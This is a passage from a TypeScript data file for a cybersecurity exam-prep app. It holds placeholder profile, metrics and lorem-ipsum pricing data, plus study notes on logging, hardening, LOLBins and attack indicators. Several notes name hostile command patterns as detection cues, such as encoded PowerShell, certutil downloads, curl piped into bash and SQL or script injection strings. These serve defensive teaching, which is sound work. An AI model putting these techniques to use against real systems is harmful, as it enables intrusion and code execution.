import {
  Home,
  BookOpen,
  BarChart3,
  FileText,
  CreditCard,
  User,
  TrendingUp,
  ArrowUp,
  CheckCircle,
  Trophy,
  Lock,
  Zap,
  Terminal,
  Shield,
  Network,
  Key,
  AlertTriangle,
  ShieldCheck,
  Users,
  Brain,
  Database,
  Search,
  Wrench,
  Crosshair,
  Workflow,
  Bot,
  ListOrdered,
} from "lucide-react";
import type { LucideIcon } from "lucide-react";

export interface NavLink {
  href: string;
  label: string;
  icon: LucideIcon;
}

export const navLinks: NavLink[] = [
  { href: "/dashboard", label: "Dashboard", icon: Home },
  { href: "/practice-exam", label: "Practice Exam", icon: BookOpen },
  { href: "/study-notes", label: "Study Notes", icon: BarChart3 },
  { href: "/attempts", label: "Attempts", icon: FileText },
  { href: "/pricing-billing", label: "Pricing & Billing", icon: CreditCard },
];

export const images = {
  logo: "/logo.png",
  logo2: "/TechTree Studies Network Logo.png",
  smallLogo: "/Magenta Purple Circuit Tree.png",
};

export const profile = {
  name: "Sarah Jenkins",
  candidateId: "#1",
  icon: User,
  surname: 'trevor_vance',
  email: 'trevor.vance@university.edu',
  person: "/user.png"
};

export const metrics = {
  examsTaken: {
    value: 14,
    label: "Exams Taken",
    icon: TrendingUp,
    change: "+3",
    changeLabel: "completed this week",
  },
  averageScore: {
    value: 782,
    maxValue: 900,
    label: "Average Score",
    icon: BarChart3,
    change: "+42 pts",
    changeLabel: "vs initial diagnostic baseline",
  },
  bestScore: {
    value: 840,
    maxValue: 900,
    label: "Best Score",
    icon: Trophy,
  },
  passRate: {
    value: "85.7%",
    label: "Pass Rate",
    icon: CheckCircle,
    detail: "12 of 14 passed",
    cutScore: "750 cut score",
  },
  certification: {
    name: "CompTIA Security+",
    accuracy: "93.3%",
    accuracyLabel: "accuracy",
  },
};

export const examAttempts = [
  {
    id: 1,
    examName: "CompTIA Security+",
    examNumber: "SY0-701",
    date: "May 19, 2025",
    time: "12:45 PM",
    score: 782,
    maxScore: 900,
    result: "PASS",
    duration: "1 hr 15 min",
    status: "pass",
  },
  {
    id: 2,
    examName: "CompTIA Security+",
    examNumber: "SY0-601",
    date: "May 19, 2025",
    time: "9:30 AM",
    score: 791,
    maxScore: 900,
    result: "FAIL",
    duration: "1 hr 45 min",
    status: "fail",
  },
];

export interface PracticeExam {
  id: string;
  code: string;
  level: "Foundational" | "Associate" | "Professional";
  title: string;
  description: string;
  access: "Free" | "Pro";
  items: number;
  timeCap: number;
  targetPass: number;
  maxScore: number;
  domains: string[];
  icon: LucideIcon;
  features: string[];
}

export const practiceExams: PracticeExam[] = [
  {
    id: "sy0-701-core",
    code: "SY0-701",
    level: "Associate",
    title: "CompTIA Security+ SY0-701 Practice Exam",
    description:
      "Validate network hardening, host monitoring, zero-trust cryptographic implementations, and standard incident remediation.",
    access: "Free",
    items: 50,
    timeCap: 90,
    targetPass: 750,
    maxScore: 900,
    domains: [
      "Threats & Attacks",
      "Cryptography",
      "Identity & Access",
      "Risk Management",
    ],
    icon: CheckCircle,
    features: ["verified", "Simulated Pearson CBT"],
  },
  {
    id: "sy0-701-threats",
    code: "SY0-701",
    level: "Associate",
    title: "Security+ Threat Detection Assessment",
    description:
      "Focus on malware analysis, social engineering attacks, cloud threats, and security monitoring practices.",
    access: "Pro",
    items: 80,
    timeCap: 100,
    targetPass: 750,
    maxScore: 900,
    domains: [
      "Threat Intelligence",
      "Attack Vectors",
      "Monitoring",
      "Incident Response",
    ],
    icon: CheckCircle,
    features: ["adaptive questions", "performance analytics"],
  },
  {
    id: "sy0-701-crypto",
    code: "SY0-701",
    level: "Associate",
    title: "Security+ Cryptography Challenge",
    description:
      "Test encryption standards, PKI concepts, certificate management, and secure communications.",
    access: "Pro",
    items: 65,
    timeCap: 85,
    targetPass: 750,
    maxScore: 900,
    domains: ["Cryptography", "PKI", "Certificates", "Secure Protocols"],
    icon: CheckCircle,
    features: ["exam-ready", "detailed explanations"],
  },
  {
    id: "sy0-701-iam",
    code: "SY0-701",
    level: "Associate",
    title: "Security+ Identity & Access Control Exam",
    description:
      "Measure knowledge of authentication methods, authorization models, MFA, and privilege management.",
    access: "Pro",
    items: 75,
    timeCap: 95,
    targetPass: 750,
    maxScore: 900,
    domains: [
      "Identity Management",
      "Access Control",
      "Federation",
      "Authentication",
    ],
    icon: CheckCircle,
    features: ["PBQs included", "exam simulation"],
  },
];

export interface PricingTier {
  id: string;
  tier: string;
  name: string;
  description: string;
  price: string;
  billing: string;
  currency?: string;
  badge?: string;
  passRate?: string;
  isPopular?: boolean;
  isCurrentPlan?: boolean;
  features: string[];
  buttonLabel: string;
  buttonAction: string;
}

export const pricingTiers: PricingTier[] = [
  {
    id: "personal",
    tier: "PERSONAL",
    name: "Personal",
    description:
      "Perfect for individuals starting their certification journey.",
    price: "R0",
    billing: "/ month",
    features: [
      "Standard Dummy Text: There are many variations of Lorem ipsum available",
      "Randomised Words: Which don't look even slightly unbelievable",
      "Free Event Passes",
    ],
    buttonLabel: "SUBSCRIBE",
    buttonAction: "subscribe",
  },
  {
    id: "team",
    tier: "TEAM",
    name: "Team",
    description:
      "Ideal for small teams and collaborative learning.",
    price: "R300",
    billing: "/ month",
    isPopular: true,
    features: [
      "All benefits of Personal: There are many variations of Lorem ipsum available",
      "Various Versions: All the Lorem ipsum generators on the internet",
      "Unlimited Storage",
    ],
    buttonLabel: "SUBSCRIBE",
    buttonAction: "subscribe",
  },
  {
    id: "corporate",
    tier: "CORPORATE",
    name: "Corporate",
    description:
      "Enterprise solution for large organizations.",
    price: "R600",
    billing: "/ month",
    features: [
      "All benefits of Team: There are many variations of Lorem ipsum available",
      "Sentence Structures: Making this the first true generator on the internet",
      "Lifetime Access to all the content",
    ],
    buttonLabel: "SUBSCRIBE",
    buttonAction: "subscribe",
  },
];

export interface NoteSection {
  heading: string;
  explain?: string;
  points: string[];
  remember?: string;
  examTip?: string;
}

export interface GlossaryItem {
  term: string;
  meaning: string;
}

export interface StudyNote {
  id: string;
  title: string;
  domain: string;
  domainName: string;
  module: string;
  moduleName: string;
  description: string;
  lastUpdated: string;
  access: "Free" | "Premium";
  icon: LucideIcon;
  estimatedTime: string;
  sections?: NoteSection[];
  quickReview?: string[];
  glossary?: GlossaryItem[];
}

export const studyNotes: StudyNote[] = [


  // ===================== DOMAIN 1.0 SECURITY OPERATIONS (34%) =====================
  {
    id: "domain-1-1",
    title: "System and Network Architecture",
    domain: "Domain 1.0",
    domainName: "Security Operations",
    module: "1.1",
    moduleName: "System and Network Architecture",
    description:
      "Logging, operating systems, infrastructure architecture, device management, zero trust and SASE, IAM, encryption, data protection and critical infrastructure.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Network,
    estimatedTime: "90 minutes",
    sections: [
      {
        heading: "Logging Concepts",
        explain:
          "Logs are the evidence trail of every investigation. If the logs are missing, wrong, or untrustworthy, you cannot prove what happened.",
        points: [
          "Ingestion: Collecting logs from devices, applications, and systems and sending them to a central location (such as a SIEM) for monitoring and analysis.",
          "Configuration: Choosing what events to record, the log level (for example error vs debug), and where logs are stored. Too little logging hides attacks; too much creates noise and cost.",
          "Integrity and security: Making sure logs cannot be altered, deleted, or read by unauthorized users. Common controls are forwarding logs to a remote collector, restricting access, and hashing or write-once storage.",
          "Time synchronization: Keeping all systems on one accurate time source (NTP, usually in UTC) so timestamps from different systems can be lined up into one timeline.",
          "Retention: How long logs are kept before they are archived or deleted. It is driven by business needs and regulation (for example PCI DSS expects 12 months of history, with the latest 3 months immediately available).",
        ],
        remember:
          "Logs are a security camera system: collect the footage (ingestion), choose what each camera records (configuration), lock the tapes away (integrity), stamp the correct time on them (time sync), and keep the tapes long enough (retention).",
        examTip:
          "Match the PROBLEM to the keyword. Events from two servers will not line up in a timeline = time synchronization (NTP). An attacker cleared the logs on the compromised host and evidence is gone = integrity (the fix is sending logs off-host to a SIEM in real time). Auditor asks for 10-month-old logs and they are deleted = retention. No visibility into what a service did = configuration (the right events were never enabled).",
      },
      {
        heading: "Operating System Concepts",
        explain:
          "To spot something abnormal, you must know what normal looks like. This section covers how a hardened OS is set up and which files and processes matter most.",
        points: [
          "System hardening: Reducing attack surface by disabling unused services and ports, removing default accounts, applying patches, enforcing least privilege, and following a baseline such as a CIS Benchmark.",
          "File structure: Windows keeps the OS in C:\\Windows, programs in C:\\Program Files, and user data in C:\\Users. Linux uses one tree starting at / with /etc (configuration), /var/log (logs), /home (users), and /tmp (temporary, writable by everyone).",
          "Critical files (Windows): the registry, the SAM database (local password hashes), NTDS.dit (all domain password hashes, on domain controllers), and the hosts file (local name resolution).",
          "Critical files (Linux): /etc/passwd (accounts), /etc/shadow (password hashes), /etc/sudoers (who can run commands as root), /etc/hosts, and ~/.ssh/authorized_keys (keys that can log in without a password).",
          "System processes: Background programs the OS needs. Windows examples are svchost.exe, lsass.exe (handles logins), winlogon.exe, and explorer.exe. Linux examples are systemd (PID 1), cron (scheduled jobs), and sshd (remote login).",
        ],
        remember:
          "An OS is a house. Hardening = locking doors and windows. File structure = the floor plan. Critical files = the safe. Processes = the people who live there. You must know who normally lives there to spot the intruder.",
        examTip:
          "Spot a fake process with three checks: wrong NAME (svch0st.exe with a zero), wrong LOCATION (svchost.exe running from C:\\Users\\Public or Temp), or wrong PARENT (winword.exe launching powershell.exe). Any one is suspicious. An unknown program reading lsass.exe memory = credential dumping. A new key added to authorized_keys or a new line in /etc/passwd = persistence. A world-writable /tmp is a normal place for attackers to drop tools.",
      },
      {
        heading: "Infrastructure and System Architecture Concepts",
        explain:
          "Modern systems run in the cloud, in virtual machines, and in containers. Each has different isolation, speed, and security responsibilities.",
        points: [
          "Cloud native: Applications built for the cloud from the start, often as microservices, containers, or serverless functions. Security follows the shared responsibility model: the provider secures the cloud itself, the customer secures their data, identities, and configuration.",
          "Virtualization: A hypervisor runs multiple virtual machines (VMs) on one physical host. Each VM has its own full operating system, so isolation is strong. Risks are VM escape (breaking out to the hypervisor) and VM sprawl (forgotten, unpatched VMs).",
          "Containerization: Applications and their dependencies are packaged into lightweight containers (Docker, orchestrated by Kubernetes). Containers share the host kernel, so they are lighter and faster than VMs but isolated less strongly. Risks are vulnerable images and exposed secrets.",
          "Application Programming Interfaces (APIs): Mechanisms that let applications exchange data (often REST with JSON). Typical risks are missing authentication, leaked API keys, no rate limiting, and returning more data than needed.",
        ],
        remember:
          "A VM is a separate house with its own foundation (own OS). A container is an apartment in a shared building (shared kernel). Cloud native = designed for the cloud from day one. An API is a waiter carrying orders between you and the kitchen: if the waiter will serve anybody, anything, anytime, you have a problem.",
        examTip:
          "Stronger isolation = VM. Lighter, faster, and shares the host kernel = container. A leaked API key in a public repo or an API that answers without logging in = API security problem (fixes: strong authentication, rate limiting, API gateway, key rotation). 'Who is responsible for patching the guest OS in IaaS' = the customer; in SaaS = the provider.",
      },
      {
        heading: "Device Management Concepts",
        explain:
          "Organizations must control both mobile devices and traditional endpoints. Management (setting the rules) is different from detection (watching for attacks).",
        points: [
          "Mobile: Managing smartphones and tablets with Mobile Device Management (MDM) or Unified Endpoint Management (UEM). Typical controls are enforced passcodes, encryption, app restrictions, containerized work data, and remote lock or wipe. Ownership models include BYOD (personal device) and COPE (company-owned, personally enabled).",
          "Endpoint: Any laptop, desktop, server, or mobile device on the network. Management covers patching, configuration baselines, application allow-listing, and disk encryption. Protection adds antivirus and EDR (which detects and responds to attacks on the endpoint).",
        ],
        remember:
          "MDM is the rulebook and remote control for the phone (lock it, encrypt it, wipe it). EDR is the bodyguard on the laptop (watch behavior, isolate it). Management sets the rules; EDR watches for rule-breakers.",
        examTip:
          "Lost or stolen phone = remote wipe through MDM. Employees use personal phones for work and the company wants to separate work data = BYOD with a managed container. Suspicious behavior on a laptop or server and you need to isolate it = EDR. 'Only approved programs may run' = application allow-listing. Do not pick EDR for 'enforce a passcode policy'; that is MDM or UEM.",
      },
      {
        heading: "Network Architecture Concepts",
        explain:
          "Network design decides how far an attacker can move after getting in. Modern designs stop trusting the network location and verify every request.",
        points: [
          "Zero Trust Network Architecture (ZTNA): No user or device is trusted by default, even inside the network. Every request is verified using identity, device health, and context, and access is limited to what is needed. Microsegmentation is a common technique. The CompTIA acronym list also expands ZTNA as Zero Trust Network Access.",
          "Secure Access Service Edge (SASE): A cloud-delivered service that combines networking (SD-WAN) with security functions such as a secure web gateway (SWG), cloud access security broker (CASB), firewall as a service (FWaaS), and ZTNA. It gives remote users and branch offices the same protection everywhere.",
          "Hybrid cloud: A mix of on-premises infrastructure and public and/or private cloud. Security challenges are consistent policy, visibility across both, and secure connections between them.",
          "Segmentation and SDN: Segmentation splits a network into zones so a breach cannot spread freely. Software-Defined Networking (SDN) separates the control plane from the data plane so network rules can be changed centrally by software.",
        ],
        remember:
          "Zero Trust is a guard who checks your ID at every door, not just the front gate. SASE is networking and security delivered from the cloud as one package. Hybrid cloud is part of your setup in your own building and part in a rented one.",
        examTip:
          "'Never trust, always verify', 'assume breach', or 'microsegmentation' = Zero Trust. Remote workers and branch offices needing identical security without sending traffic back to HQ = SASE. 'Some servers stay in our data center, others run in AWS' = hybrid cloud. Attacker moved laterally from one workstation to a database server = the fix is segmentation.",
      },
      {
        heading: "Authentication and Authorization Methods",
        explain:
          "Authentication proves who you are. Authorization decides what you may do afterward. Many exam questions test whether you can tell them apart.",
        points: [
          "Authentication factors: Something you know (password, PIN), something you have (token, phone, smart card), something you are (fingerprint, face), and somewhere you are (location). Multifactor authentication (MFA) needs two or more DIFFERENT categories.",
          "Single sign-on (SSO): One login gives access to many applications. It reduces password fatigue but makes the SSO account a high-value target.",
          "SAML: An XML-based standard that lets an identity provider tell an application that a user has been authenticated. Common for enterprise SSO.",
          "OAuth 2.0 and OpenID Connect: OAuth is for AUTHORIZATION (an app gets limited access to your data using a token, without your password). OpenID Connect is a layer on top of OAuth that adds AUTHENTICATION (it tells the app who you are).",
          "Kerberos: A ticket-based authentication protocol used by Active Directory. Related attacks are pass-the-ticket and Kerberoasting.",
          "Authorization models: Role-based access control (RBAC) gives permissions by job role. Attribute-based access control (ABAC) decides using attributes such as department, device, time, or location. Least privilege means giving only the access needed.",
        ],
        remember:
          "AuthN = 'Who are you?' (show your passport). AuthZ = 'What are you allowed to do here?' (the visa rules). MFA = two different kinds of proof, such as a passport plus a fingerprint, not two passports.",
        examTip:
          "A password plus a security question is NOT MFA (both are 'something you know'). 'Let an app read my calendar without giving it my password' = OAuth. 'Log in once and open all company apps' = SSO (SAML or OpenID Connect). Permissions based on job title = RBAC; based on attributes like time and device = ABAC. Logging in is authentication; what you can open afterward is authorization.",
      },
      {
        heading: "Privileged Access Management and Secrets Management",
        explain:
          "Admin accounts and secrets such as passwords and API keys are the most valuable things an attacker can steal, so they need extra protection.",
        points: [
          "Privileged Access Management (PAM): Controls and monitors accounts with elevated rights. Common features are a password vault with check-out, just-in-time (temporary) access, session recording, and approval workflows.",
          "Secrets management: Securely storing, distributing, and rotating secrets such as passwords, API keys, tokens, certificates, and encryption keys in a vault instead of in code or configuration files.",
          "Common failures: Hard-coded credentials in source code, secrets committed to public repositories, shared admin passwords, and secrets that are never rotated.",
        ],
        remember:
          "PAM is a bodyguard and a logbook for the admin accounts: you must sign for the master key, someone watches you use it, and you hand it back. Secrets belong in a vault, never taped to the code.",
        examTip:
          "A password or API key found in a GitHub repository or script = secrets management failure (move it to a vault, rotate the exposed key immediately). An administrator account being misused, or admins who need power only for a short task = PAM with just-in-time access and session recording. Rotating a leaked key is mandatory even after you delete the commit, because it is already in the history.",
      },
      {
        heading: "Encryption Techniques",
        explain:
          "Encryption protects confidentiality, hashing protects integrity, and digital signatures prove who sent something. Picking the right one for the need is the skill tested.",
        points: [
          "Symmetric encryption: One shared key encrypts and decrypts. It is fast and used for large amounts of data (AES). The challenge is sharing the key safely.",
          "Asymmetric encryption: A public and private key pair. What one key encrypts, only the other decrypts (RSA, ECC). It is slower and used for key exchange and signatures.",
          "Hashing: A one-way function that produces a fixed-length fingerprint (SHA-256). It cannot be reversed and is used to check integrity. MD5 and SHA-1 are considered weak.",
          "Digital signature: A hash signed with the sender's private key. Anyone can verify it with the public key, which proves integrity, authenticity, and non-repudiation.",
        ],
        remember:
          "Symmetric = one key, like a house key you copy for a friend. Asymmetric = a public padlock anyone can snap shut, but only your private key opens it. Hash = a fingerprint: you can compare it, but you can never turn it back into the person.",
        examTip:
          "Encrypt lots of data quickly = symmetric (AES). Exchange keys or sign something = asymmetric (RSA, ECC). Prove a file was not changed = hash (SHA-256). Prove WHO sent a message and that it was not altered = digital signature (signed with the PRIVATE key). 'Decrypt a hash' is always a wrong answer. To send a confidential message to Bob, encrypt with Bob's PUBLIC key.",
      },
      {
        heading: "PKI, TLS, and Data States",
        explain:
          "Public key infrastructure and TLS make asymmetric encryption usable on the internet. Data must be protected in all three of its states.",
        points: [
          "Public Key Infrastructure (PKI): The system of certificate authorities (CAs), digital certificates, and revocation that proves a public key belongs to a specific owner. Revoked certificates are listed in a CRL or checked by OCSP.",
          "TLS and SSL: TLS secures data in transit (HTTPS). It uses asymmetric encryption to agree on a session key, then symmetric encryption for the data. SSL is the old, insecure predecessor; use TLS 1.2 or 1.3.",
          "Data at rest: Stored data (disk, database, backup), protected with full-disk or database encryption.",
          "Data in transit: Data moving across a network, protected with TLS, VPN, or SSH.",
          "Data in use: Data being processed in memory. It is the hardest to protect and relies on access control and secure enclaves.",
        ],
        remember:
          "PKI is the passport office: a trusted authority vouches that this public key really belongs to this website. TLS is the sealed armored truck for data on the road; disk encryption is the safe for data in the warehouse.",
        examTip:
          "Browser shows a certificate warning = expired, self-signed, wrong name, or untrusted CA. Stolen laptop with encrypted disk = data at rest protected. Sniffing on public Wi-Fi defeated by HTTPS = data in transit. A compromised private key means the certificate must be revoked and replaced. Questions about 'SSL' on the exam usually mean the old protocol is the problem; the answer is TLS.",
      },
      {
        heading: "Data Protection Concepts",
        explain:
          "You cannot protect data you have not identified. Data protection starts with knowing what data you have and how sensitive it is.",
        points: [
          "Classification: Labeling data by sensitivity (for example public, internal, confidential, restricted) so stronger controls go to more sensitive data. It includes Personally Identifiable Information (PII).",
          "Data Loss Prevention (DLP): Tools that detect and block sensitive data leaving through email, USB, cloud uploads, or printing.",
          "Masking: Hiding part of a value (for example ****-****-****-1234) so users see only what they need.",
          "Tokenization: Replacing a sensitive value with a random stand-in token. The real value is stored in a separate secure vault.",
          "Backups and availability: Regular tested backups protect against ransomware and failure. Data protection covers confidentiality, integrity, and availability.",
        ],
        remember:
          "Label it, lock it, watch it. Classification = the label. Encryption and access control = the lock. DLP = the camera at the exit. Masking = blurring the number on the screen. Tokenization = swapping the real card for a casino chip.",
        examTip:
          "Sensitive data leaving by email, USB, or cloud upload = DLP. Deciding how strongly to protect something = classification. Developers need realistic test data without real customer values = masking or tokenization. A payment system that should never store real card numbers = tokenization. Masking changes what is displayed; tokenization changes what is stored.",
      },
      {
        heading: "Critical Infrastructure Concepts",
        explain:
          "Power, water, and manufacturing run on specialized systems where a security action can cause physical harm. Safety and uptime come before everything else.",
        points: [
          "Operational Technology (OT): Hardware and software that monitors and controls physical equipment such as valves, motors, and sensors.",
          "Industrial Control System (ICS): Systems that automate industrial processes. Typical parts are PLCs (controllers), HMIs (operator screens), and sensors and actuators.",
          "Supervisory Control and Data Acquisition (SCADA): A type of ICS that collects data from remote sites and gives central monitoring and control (for example a pipeline or power grid).",
          "Security approach: Segment OT from IT, monitor passively, restrict remote access, and test patches carefully. Many OT devices are legacy, cannot be patched often, and use protocols without authentication (such as Modbus).",
        ],
        remember:
          "OT is the big umbrella, ICS sits under it, and SCADA is an ICS that watches over remote sites. In OT, safety and uptime beat everything: a patch that crashes a power plant is worse than a delay.",
        examTip:
          "Water, power, pipeline, or factory scenario = availability and safety first. Safe answers: segment OT from IT, passive monitoring, strict remote access. Be wary of answers that suggest active scanning, rebooting, or rushing patches on live OT systems. 'Central control of remote field sites' = SCADA. 'Controller running the production line' = PLC.",
      },
    ],
  },
  {
    id: "domain-1-2",
    title: "Analyzing Indicators of Malicious Activity",
    domain: "Domain 1.0",
    domainName: "Security Operations",
    module: "1.2",
    moduleName: "Indicators of Malicious Activity",
    description:
      "Network, host, application, cloud, identity, and email indicators, plus social engineering such as typosquatting and business email compromise.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Search,
    estimatedTime: "85 minutes",
    sections: [
      {
        heading: "Network-related Indicators",
        explain:
          "Attackers must communicate over the network, which leaves traces. Knowing normal traffic is how you spot the abnormal.",
        points: [
          "Rogue devices: Unauthorized devices on the network (an unknown laptop, a hidden Wi-Fi access point, a Raspberry Pi) that can steal data or give an attacker a foothold.",
          "Enumeration: Gathering details about targets, such as live hosts, open ports, running services, users, and shares. Port scanning finds what is open; enumeration extracts what is behind it.",
          "Anomalous activity: Unusual traffic such as sudden spikes, odd hours, new destinations, or beaconing (connections to the same outside address at regular intervals, a sign of command and control).",
          "Activity on unexpected ports: Traffic on ports the organization does not normally use, or a known protocol on the wrong port (for example SSH on port 443 or DNS tunneling data).",
        ],
        remember:
          "A burglar casing a neighborhood: enumeration = knocking on every door and checking every window. A rogue device = a stranger who slipped inside the gate. An unexpected port = a back door nobody knew existed. Beaconing = the burglar's lookout calling home every 60 seconds.",
        examTip:
          "One host touching many ports, or many hosts in a short time = scanning or enumeration. Unknown MAC address or device on the VLAN = rogue device. Equal-interval connections to an external IP = beaconing (C2). Huge outbound transfer at 3 AM = possible exfiltration. A protocol on a non-standard port (SSH on 443) = evasion or tunneling.",
      },
      {
        heading: "Host-related Indicators: Resource Use and Unauthorized Software",
        explain:
          "Malware has to run on a host, so it consumes resources and installs things. These are often the first visible signs.",
        points: [
          "Resource consumption: Unexplained high CPU, memory, disk, or network use, often from cryptominers, botnet clients, or ransomware.",
          "Unauthorized software: Programs installed without approval, such as remote access tools, cracked software, or password crackers, which may carry malware or break policy.",
          "Anomalous activity: Unexpected crashes, slowdowns, new startup items, or users doing things outside their normal pattern.",
        ],
        remember:
          "Think of a house where the electricity meter is spinning but nobody is home: something is running in the background. Software you did not install is a stranger's furniture in your living room.",
        examTip:
          "Unexplained 100% CPU with no user activity = cryptominer. A remote administration tool nobody approved = unauthorized software (possible persistence). A server suddenly uploading gigabytes = check for exfiltration. First step on an unexplained high-CPU host: identify the process, its location, and its parent.",
      },
      {
        heading: "Host-related Indicators: Suspicious Processes and LOLBins",
        explain:
          "Smart attackers avoid bringing their own tools. They abuse legitimate system programs so nothing looks foreign.",
        points: [
          "Suspicious or rogue processes: Processes with a strange name, wrong location, odd parent, unusual network connections, or no digital signature.",
          "Living Off the Land Binaries (LOLBins) and scripts: Legitimate tools such as PowerShell, cmd, certutil, mshta, rundll32, wmic, and bash that attackers abuse to download, run, or hide malicious code.",
          "Telltale usage: powershell -enc (Base64-encoded command), -WindowStyle Hidden, certutil -urlcache (download a file), mshta or rundll32 loading remote content, and curl or wget piped into bash.",
        ],
        remember:
          "LOLBins = a burglar using your own ladder and crowbar, so nothing looks foreign. The tool is legitimate; the BEHAVIOR is the clue. Winword starting PowerShell is like a receptionist suddenly cracking the safe.",
        examTip:
          "Do not look for 'malware files'; look for odd behavior of normal tools. PowerShell with -enc and a hidden window = obfuscated, likely malicious. certutil downloading from the internet = LOLBin abuse. Word or Excel as the parent of cmd or PowerShell = macro-based attack. The defense is behavioral detection (EDR, command-line logging), not file hashes.",
      },
      {
        heading: "Host-related Indicators: File Changes, Exfiltration, and Configuration",
        explain:
          "Attackers eventually change files, steal data, and weaken protections. These changes are strong evidence of compromise.",
        points: [
          "File system changes: Unexpected creation, deletion, modification, or encryption of files, such as mass renaming with a new extension, new files in system folders, or changed system binaries.",
          "Data exfiltration: Unauthorized transfer of data out of the organization, often a large archive (zip, rar) created and then uploaded to an external or cloud location.",
          "Unauthorized configuration changes: Security settings changed without approval, such as antivirus or firewall disabled, new local administrators, changed registry run keys, or new scheduled tasks.",
        ],
        remember:
          "A thief who first disables the alarm (configuration), then packs the valuables into a box (archive), then carries the box out the door (exfiltration). Mass file renames are the vandal who spray-paints everything on the way out (ransomware).",
        examTip:
          "Thousands of files renamed to a new extension in minutes = ransomware. Large archive created, then big outbound upload to an unknown IP = exfiltration. Antivirus or logging suddenly disabled = defense evasion (unauthorized configuration). New scheduled task or run-key entry = persistence. Changed critical system file = check integrity with hashes or file integrity monitoring.",
      },
      {
        heading: "Application-related Indicators",
        explain:
          "Applications are a common target. Indicators show up in app logs, error rates, and unusual transactions.",
        points: [
          "Service disruption: The application becomes slow or unavailable because of denial of service, resource exhaustion, malware, or unauthorized changes.",
          "Anomalous activity: Unexpected errors, odd queries, unusual input in logs, unknown accounts created in the app, spikes in API calls, or transactions that do not fit normal behavior.",
        ],
        remember:
          "A shop: service disruption = the doors are jammed and customers are locked out. Anomalous activity = the cash register doing things nobody told it to do, like odd refunds at 3 AM.",
        examTip:
          "App suddenly slow or down with a flood of requests from many sources = DoS. Odd characters in input fields such as ' OR 1=1 or <script> in the logs = injection attempt (SQLi or XSS). New admin account created inside the app, or abnormal API call volume = application anomaly; check the application logs first.",
      },
      {
        heading: "Cloud-related Indicators",
        explain:
          "Cloud attackers want your resources and your keys. The audit log and the bill are the first places to look.",
        points: [
          "Anomalous activity: Unexpected logins, API calls from unusual locations, resources created in regions you never use, or changes to permissions and logging settings.",
          "Resource compromise: Cloud virtual machines, storage, or databases controlled by an unauthorized party. Examples are cryptomining VMs, a storage bucket made public, or stolen access keys.",
          "Where to look: Cloud audit logs (for example AWS CloudTrail, Azure Activity Log), billing alerts, and identity logs.",
        ],
        remember:
          "A stolen company credit card: you notice strange purchases in countries you never use and a bill that suddenly jumps. The audit log is the card statement that tells on the thief.",
        examTip:
          "New VMs in an unused region plus a cost spike = cryptomining on compromised cloud resources. Storage bucket suddenly public = misconfiguration or compromise. API calls from leaked access keys from an unusual location = compromised credentials (rotate the keys, review CloudTrail). Attacker disabling logging = defense evasion.",
      },
      {
        heading: "Social Engineering Attacks",
        explain:
          "Social engineering attacks target people, not systems. These two tricks make a fake link look real.",
        points: [
          "Typosquatting: Registering a domain that looks like a real one with a small change (rnicrosoft.com uses 'rn' instead of 'm', or goggle.com), to catch typing mistakes or fool readers.",
          "URL shorteners: Services (such as bit.ly) that hide the real destination of a link. Attackers use them to bypass filters and hide malicious sites.",
          "Checks: Inspect the domain carefully, expand the short link in a safe tool, and check the domain age with WHOIS. A domain registered days ago is a red flag.",
        ],
        remember:
          "Typosquatting = a fake shop sign with one letter changed. A URL shortener = a wrapped gift box: you cannot see what is inside until you open it. Look before you click.",
        examTip:
          "A domain one character off from a real brand = typosquatting. A short link in an unexpected email = expand it safely and check the destination before opening. A very new domain mimicking your company = typosquatting or phishing infrastructure (WHOIS creation date). Do not open the link yourself to 'see what happens'; use a sandbox or reputation tool.",
      },
      {
        heading: "Identity-based Indicators",
        explain:
          "Attackers log in rather than break in. Compromised accounts leave patterns in authentication logs.",
        points: [
          "IAM account compromise: An attacker takes over an identity and uses it for unauthorized actions. Signs include new MFA devices, forwarding rules, new access keys, and permission changes.",
          "Unauthorized access: A user reaching systems or data outside their job role, or using access at odd times.",
          "Impossible travel: The same account logs in from two locations too far apart for the time between them.",
          "Related attack patterns: Brute force (many passwords against one account), password spraying (one common password against many accounts), credential stuffing (leaked username and password pairs), and MFA fatigue (repeated push prompts until the user approves).",
        ],
        remember:
          "Impossible travel = your card is swiped in New York and ten minutes later in Tokyo. Nobody flies that fast, so one swipe is a thief. Spraying = trying one key on every door; brute force = trying every key on one door.",
        examTip:
          "Two logins from distant countries minutes apart = impossible travel. Many accounts each with one failed attempt from one IP = password spraying (it avoids lockouts). Many attempts on one account = brute force. Many MFA prompts the user did not start = MFA fatigue. User opening data outside their role = unauthorized access or privilege abuse. Response: reset credentials, revoke sessions, review recent activity.",
      },
      {
        heading: "Email-related Attacks: Business Email Compromise",
        explain:
          "BEC steals money using trust, not malware. There is often no malicious link or attachment to detect.",
        points: [
          "Business Email Compromise (BEC): An attacker impersonates an executive, vendor, or trusted contact (by spoofing or by using a compromised mailbox) to trick staff into sending money or sensitive data.",
          "Common forms: CEO fraud (urgent payment request), vendor bank-detail change, payroll diversion, and gift-card requests.",
          "Warning signs: Urgency and secrecy, a reply-to address that differs from the sender, a look-alike domain, and a request to bypass normal approval.",
        ],
        remember:
          "BEC is a con artist wearing your boss's face. There is no virus and no bad link, just a believable request like 'Wire the payment today, I am in a meeting.' The weapon is trust and urgency.",
        examTip:
          "Urgent payment request from an 'executive', or a vendor suddenly changing bank details = BEC. No attachment or link involved, so antivirus will not catch it; the best defense is verifying by a second channel (phone call to a known number) and a payment approval process. Check the header: reply-to mismatch and failed SPF, DKIM, or DMARC support spoofing.",
      },
      {
        heading: "Email Authentication: SPF, DKIM, and DMARC",
        explain:
          "These three DNS-based checks help receiving servers decide whether an email really came from the domain it claims.",
        points: [
          "Sender Policy Framework (SPF): A DNS record listing the mail servers allowed to send for a domain. The receiver checks the sending server's IP against it.",
          "DomainKeys Identified Mail (DKIM): The sending server signs the message with a private key; the receiver verifies the signature with the public key in DNS. It proves the message was not altered and came from an authorized system.",
          "Domain-based Message Authentication, Reporting, and Conformance (DMARC): A policy that tells receivers what to do when SPF or DKIM fail (none, quarantine, reject) and sends reports back to the domain owner.",
        ],
        remember:
          "SPF = the guest list at the door (is this server allowed to send for us?). DKIM = a wax seal on the envelope (was it tampered with, and is it really ours?). DMARC = the rule for the bouncer: what to do with guests who fail the list or the seal.",
        examTip:
          "'Which server is allowed to send mail for the domain' = SPF. 'Verify the message was not changed using a signature' = DKIM. 'Tell receivers to reject spoofed mail and send reports' = DMARC. Email header shows spf=fail, dkim=fail, dmarc=fail = likely spoofed. Check these results in the header or with MXToolbox.",
      },
    ],
  },
  {
    id: "domain-1-3",
